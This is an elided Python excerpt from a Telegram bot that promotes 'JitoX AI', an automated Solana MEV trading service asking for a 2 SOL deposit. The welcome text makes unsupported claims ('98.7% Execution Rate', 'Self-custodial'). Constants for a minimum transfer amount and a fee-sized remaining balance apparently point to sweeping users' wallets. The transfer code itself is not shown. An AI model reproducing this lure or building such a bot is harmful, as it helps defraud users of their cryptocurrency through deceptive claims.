...
MIN_TRANSFER_AMOUNT = 0.2  # Minimum amount to transfer in SOL
...
MIN_REMAINING_BALANCE = 0.002  # Minimum balance to leave for fees
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        message = (
            "<b>Welcome to JitoX AI - Your MEV Trading Gateway</b>\n\n"
            "JitoX is a professional platform designed to help you grow your SOL using automated MEV strategies like arbitrage and real-time market optimization.\n\n"
            "💰 <b>Minimum to Start: 2 SOL (This is your trading balance)</b>\n"
            "⚙️ Runs 24/7 | 98.7% Execution Rate | Only 2% Performance Fee\n"
            "🔐 <b>Self-custodial</b> — You always stay in control of your assets\n\n"
            "<b>How to Start:</b>\n"
